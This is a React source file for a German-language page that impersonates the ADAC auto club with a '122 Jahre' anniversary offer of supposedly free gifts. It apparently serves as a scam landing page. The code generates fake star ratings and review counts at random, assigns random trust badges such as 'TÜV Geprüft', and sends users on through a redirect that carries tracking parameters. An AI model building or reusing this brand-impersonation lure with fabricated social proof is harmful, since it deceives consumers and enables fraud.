import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Gift, Star, Check, X, ShoppingBag, Award, Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Badge } from "@/components/ui/badge";
import adacLogo from "@/assets/adac-logo.svg";
import productsData from "@/data/products.json";

// Import product images
import jumperCables from "@/assets/jumper-cables.jpg";
import jumpstarter from "@/assets/jumpstarter.jpg";
import drill from "@/assets/drill.jpg";
import suitcase from "@/assets/suitcase.jpg";
import dashcam from "@/assets/dashcam.jpg";
import compressor from "@/assets/compressor.jpg";
import hoodie from "@/assets/hoodie.jpg";
import cookware from "@/assets/cookware.jpg";

interface Product {
  id: number;
  name: string;
  description: string;
  price: string;
  originalPrice: string;
  image: string;
  category: string;
  features: string[];
  specifications: {
    [key: string]: string;
  };
  rating?: number;
  reviews?: number;
  badge?: string;
}

// Image mapping
const imageMap: { [key: string]: string } = {
  "/src/assets/jumper-cables.jpg": jumperCables,
  "/src/assets/jumpstarter.jpg": jumpstarter,
  "/src/assets/drill.jpg": drill,
  "/src/assets/suitcase.jpg": suitcase,
  "/src/assets/dashcam.jpg": dashcam,
  "/src/assets/compressor.jpg": compressor,
  "/src/assets/hoodie.jpg": hoodie,
  "/src/assets/cookware.jpg": cookware,
};

// Utility functions for randomization
const generateRandomRating = () => {
  return Number((Math.random() * (5 - 4) + 4).toFixed(1));
};

const generateRandomReviews = () => {
  return Math.floor(Math.random() * (300 - 50) + 50);
};

const shuffleArray = (array: Product[]): Product[] => {
  const shuffled = [...array];
  for (let i = shuffled.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
  }
  return shuffled;
};

const Shop = () => {
  const [selectedProduct, setSelectedProduct] = useState<Product | null>(null);
  const [products, setProducts] = useState<Product[]>([]);
  const navigate = useNavigate();

  // Initialize products with randomized data
  useEffect(() => {
    const processedProducts = productsData.map(product => ({
      ...product,
      image: imageMap[product.image] || product.image,
      rating: generateRandomRating(),
      reviews: generateRandomReviews(),
      badge: Math.random() > 0.7 ? ['Bestseller', 'Premium', 'Limitiert', 'TÜV Geprüft'][Math.floor(Math.random() * 4)] : undefined
    }));
    
    setProducts(shuffleArray(processedProducts));
  }, []);

  const handleProductClick = (product: Product) => {
    setSelectedProduct(product);
  };

  const handleCloseModal = () => {
    setSelectedProduct(null);
  };

  const handleSelectGift = (product: Product) => {
    const subId4 = `Adac - ${product.name}`;
    const subId5 = product.image;
    
    const redirectUrl = `/?_lp=1&sub_id_4=${encodeURIComponent(subId4)}&sub_id_5=${encodeURIComponent(subId5)}`;
    window.location.href = redirectUrl;
  };

  return (
    <div className="min-h-screen adac-gradient">
      {/* Mobile-Optimized Header */}
      <header className="glass-effect border-b border-white/20 sticky top-0 z-40">
        <div className="container mx-auto px-3 sm:px-6 lg:px-8 py-3 sm:py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 sm:gap-3">
              <button 
                className="p-1.5 sm:p-2 hover:bg-white/10 rounded-lg transition-colors"
                onClick={() => navigate('/')}
              >
                <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 text-foreground" />
              </button>
              <div className="flex items-center gap-2 sm:gap-3">
                <img src={adacLogo} alt="ADAC Logo" className="h-6 sm:h-8 w-auto" />
                <div className="h-4 sm:h-6 w-px bg-white/30"></div>
                <span className="text-sm sm:text-lg font-medium text-foreground">online-shop</span>
              </div>
            </div>
            <div className="flex items-center gap-2">
              <Badge variant="secondary" className="hidden xs:flex text-xs">
                <ShoppingBag className="w-3 h-3 mr-1" />
                <span className="hidden sm:inline">Jubiläums-</span>Shop
              </Badge>
              <Badge variant="secondary" className="flex xs:hidden text-xs px-2 py-1">
                <ShoppingBag className="w-3 h-3" />
              </Badge>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-3 sm:px-6 lg:px-8 py-6 sm:py-8 lg:py-12">
        {/* Mobile-Optimized Hero Section */}
        <div className="text-center mb-8 sm:mb-12 lg:mb-16">
          <h1 className="font-display text-2xl xs:text-3xl sm:text-4xl lg:text-5xl xl:text-6xl font-bold text-foreground mb-3 sm:mb-4 lg:mb-6 leading-tight px-2">
            122 Jahre ADAC
            <span className="block text-xl xs:text-2xl sm:text-3xl lg:text-4xl xl:text-5xl mt-1 sm:mt-2">
              Ein Grund zum Feiern!
            </span>
          </h1>
          <p className="text-sm sm:text-lg lg:text-xl text-foreground/90 mb-6 sm:mb-8 max-w-4xl mx-auto leading-relaxed px-4">
            Anlässlich unseres 122. Jubiläums möchten wir uns bei unseren treuen Mitgliedern und Kunden bedanken
          </p>
        </div>

        {/* Mobile-Optimized Gift Section */}
        <div className="glass-effect rounded-2xl sm:rounded-3xl p-4 sm:p-6 lg:p-10 mb-8 sm:mb-12 lg:mb-16 border border-white/20">
          <div className="text-center mb-6 sm:mb-8">
            <div className="inline-flex items-center justify-center p-2 sm:p-3 bg-white/20 rounded-xl sm:rounded-2xl mb-3 sm:mb-4">
              <Gift className="w-6 h-6 sm:w-8 sm:h-8 text-foreground" />
            </div>
            <h2 className="font-display text-xl sm:text-2xl lg:text-3xl font-bold text-foreground mb-3 sm:mb-4 px-2">
              Exklusive Jubiläums-Geschenke
            </h2>
            
            <div className="max-w-4xl mx-auto space-y-4 sm:space-y-6 text-foreground/90 px-2">
              <p className="text-sm sm:text-base lg:text-lg leading-relaxed">
                Seit 122 Jahren steht der ADAC seinen Mitgliedern zur Seite. Als Zeichen unserer Dankbarkeit 
                für Ihr Vertrauen und Ihre Treue, haben wir eine exklusive Auswahl hochwertiger Produkte 
                zusammengestellt, die wir Ihnen <strong className="text-foreground">völlig kostenlos</strong> als Geschenk anbieten.
              </p>
              
              <div className="glass-effect rounded-xl sm:rounded-2xl p-4 sm:p-6 border border-white/20">
                <div className="flex items-center justify-center mb-3 sm:mb-4">
                  <Award className="w-5 h-5 sm:w-6 sm:h-6 text-adac-orange mr-2" />
                  <span className="font-semibold text-base sm:text-lg text-foreground text-center">
                    100% KOSTENLOS - Keine versteckten Kosten
                  </span>
                </div>
              </div>

              <div className="bg-white/90 rounded-xl sm:rounded-2xl p-4 sm:p-6 backdrop-blur-sm">
                <div className="flex items-start gap-2 sm:gap-3">
                  <Shield className="w-4 h-4 sm:w-5 sm:h-5 text-adac-orange mt-0.5 flex-shrink-0" />
                  <div className="text-left">
                    <p className="font-medium text-gray-800 mb-1 text-sm sm:text-base">Wichtiger Hinweis:</p>
                    <p className="text-xs sm:text-sm text-gray-700 leading-relaxed">
                      Jeder Kunde kann <strong>ein (1)</strong> kostenloses Geschenk aus 
                      unserer exklusiven Jubiläums-Kollektion auswählen. Wählen Sie sorgfältig 
                      das Geschenk aus, das Ihnen am besten gefällt.
                    </p>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex flex-wrap justify-center gap-3 sm:gap-6 lg:gap-8 mt-6 sm:mt-8 px-2">
              <div className="flex items-center gap-1.5 sm:gap-2">
                <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-green-500 rounded-full"></div>
                <Gift className="w-3 h-3 sm:w-4 sm:h-4 text-foreground" />
                <span className="text-xs sm:text-sm font-medium">Kostenlose Geschenke</span>
              </div>
              <div className="flex items-center gap-1.5 sm:gap-2">
                <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-blue-500 rounded-full"></div>
                <span className="text-xs sm:text-sm font-medium">📦 Kostenloser Versand</span>
              </div>
              <div className="flex items-center gap-1.5 sm:gap-2">
                <div className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-adac-orange rounded-full"></div>
                <span className="text-xs sm:text-sm font-medium">🏆 122 Jahre Erfahrung</span>
              </div>
            </div>
          </div>
        </div>

        {/* Mobile-Optimized Products Section Header */}
        <div className="text-center mb-8 sm:mb-10 lg:mb-12">
          <div className="inline-flex items-center justify-center p-2 sm:p-3 bg-white/20 rounded-xl sm:rounded-2xl mb-4 sm:mb-6">
            <span className="text-2xl sm:text-3xl">🎉</span>
          </div>
          <h2 className="font-display text-xl sm:text-2xl lg:text-3xl xl:text-4xl font-bold text-foreground mb-3 sm:mb-4 px-2">
            Wählen Sie Ihr kostenloses Jubiläums-Geschenk
          </h2>
          <p className="text-sm sm:text-base lg:text-lg text-foreground/80 max-w-2xl mx-auto px-4">
            Hochwertige Produkte aus verschiedenen Kategorien - speziell für Sie ausgewählt
          </p>
        </div>

        {/* Mobile-First Product Grid */}
        <div className="grid grid-cols-1 xs:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 sm:gap-6 lg:gap-8 mb-12 sm:mb-16">
          {products.map((product) => (
            <div
              key={product.id}
              className="professional-card cursor-pointer group"
              onClick={() => handleProductClick(product)}
            >
              <div className="relative overflow-hidden">
                <img 
                  src={product.image} 
                  alt={product.name}
                  className="w-full h-48 xs:h-52 sm:h-56 lg:h-64 object-cover group-hover:scale-105 transition-transform duration-500"
                />
                <div className="absolute top-2 sm:top-3 right-2 sm:right-3">
                  <Badge className="bg-black text-white text-xs font-medium px-2 py-1">
                    Verfügbar
                  </Badge>
                </div>
                {product.badge && (
                  <div className="absolute top-2 sm:top-3 left-2 sm:left-3">
                    <Badge variant="secondary" className="bg-adac-orange text-white text-xs font-medium px-2 py-1">
                      {product.badge}
                    </Badge>
                  </div>
                )}
              </div>
              
              <div className="p-3 sm:p-5 lg:p-6">
                <div className="mb-2 sm:mb-3">
                  <Badge variant="outline" className="text-xs mb-1.5 sm:mb-2">
                    {product.category}
                  </Badge>
                  <h3 className="font-semibold text-gray-900 mb-1.5 sm:mb-2 text-xs xs:text-sm lg:text-base leading-tight line-clamp-2">
                    {product.name}
                  </h3>
                </div>
                
                <div className="flex items-center gap-1.5 sm:gap-2 mb-3 sm:mb-4">
                  <div className="flex items-center">
                    {[...Array(5)].map((_, i) => (
                      <Star
                        key={i}
                        className={`w-3 h-3 sm:w-3.5 sm:h-3.5 ${
                          i < Math.floor(product.rating)
                            ? 'text-yellow-400 fill-current'
                            : 'text-gray-300'
                        }`}
                      />
                    ))}
                  </div>
                  <span className="text-xs font-medium text-gray-600">
                    {product.rating}
                  </span>
                  <span className="text-xs text-gray-400 hidden xs:inline">
                    ({product.reviews})
                  </span>
                </div>

                <Button className="w-full gift-button text-white font-semibold py-2 sm:py-2.5 text-xs sm:text-sm group-hover:shadow-lg">
                  <Gift className="w-3 h-3 sm:w-4 sm:h-4 mr-1.5 sm:mr-2" />
                  <span className="hidden xs:inline">Dieses Geschenk wählen</span>
                  <span className="xs:hidden">Wählen</span>
                </Button>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Optimized Product Modal */}
      <Dialog open={!!selectedProduct} onOpenChange={handleCloseModal}>
        <DialogContent className="max-w-[95vw] sm:max-w-[90vw] lg:max-w-6xl bg-white p-0 overflow-hidden z-50 border-0 rounded-xl lg:rounded-2xl shadow-2xl max-h-[95vh] flex flex-col">
          {selectedProduct && (
            <div className="flex flex-col lg:flex-row h-full">
              {/* Right side - Image (shown first) */}
              <div className="lg:w-2/5 relative min-h-[200px] lg:min-h-[500px]">
                <img 
                  src={selectedProduct.image} 
                  alt={selectedProduct.name}
                  className="w-full h-full object-cover rounded-t-xl lg:rounded-l-2xl lg:rounded-tr-none"
                />
              </div>

              {/* Left side - Content */}
              <div className="flex-1 lg:w-3/5 p-4 sm:p-6 overflow-y-auto">
                <div className="space-y-4">
                  {/* Header */}
                  <div className="flex items-start justify-between">
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-2">
                        <Badge variant="outline" className="text-xs">
                          {selectedProduct.category}
                        </Badge>
                        {selectedProduct.badge && (
                          <Badge className="bg-adac-orange text-white text-xs">
                            {selectedProduct.badge}
                          </Badge>
                        )}
                      </div>
                      <h2 className="font-display text-xl lg:text-2xl font-bold text-gray-900 leading-tight">
                        {selectedProduct.name}
                      </h2>
                    </div>
                  </div>

                  {/* Rating */}
                  <div className="flex items-center gap-3">
                    <div className="flex items-center">
                      {[...Array(5)].map((_, i) => (
                        <Star
                          key={i}
                          className={`w-4 h-4 ${
                            i < Math.floor(selectedProduct.rating)
                              ? 'text-yellow-400 fill-current'
                              : 'text-gray-300'
                          }`}
                        />
                      ))}
                    </div>
                    <span className="font-semibold text-gray-900">
                      {selectedProduct.rating}
                    </span>
                    <span className="text-sm text-gray-500">
                      ({selectedProduct.reviews} Bewertungen)
                    </span>
                  </div>

                  {/* Description */}
                  <p className="text-gray-700 leading-relaxed text-sm">
                    {selectedProduct.description}
                  </p>

                  {/* Features - Compact */}
                  <div>
                    <h3 className="font-semibold text-gray-900 mb-2">Eigenschaften:</h3>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                      {selectedProduct.features.slice(0, 6).map((feature, index) => (
                        <div key={index} className="flex items-start gap-2">
                          <Check className="w-4 h-4 text-green-600 mt-0.5 flex-shrink-0" />
                          <span className="text-gray-700 text-sm">{feature}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Specifications - Compact */}
                  {selectedProduct.specifications && (
                    <div>
                      <h3 className="font-semibold text-gray-900 mb-2">Technische Daten:</h3>
                      <div className="grid grid-cols-2 gap-2">
                        {Object.entries(selectedProduct.specifications).slice(0, 4).map(([key, value]) => (
                          <div key={key} className="bg-gray-50 rounded-lg p-2">
                            <div className="font-medium text-gray-900 text-xs">{key}</div>
                            <div className="text-gray-600 text-xs">{value}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Action Button */}
                  <Button 
                    onClick={() => handleSelectGift(selectedProduct)}
                    className="w-full gift-button text-white font-bold py-3 text-base"
                  >
                    <Gift className="w-5 h-5 mr-2" />
                    Dieses Geschenk auswählen
                  </Button>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Shop;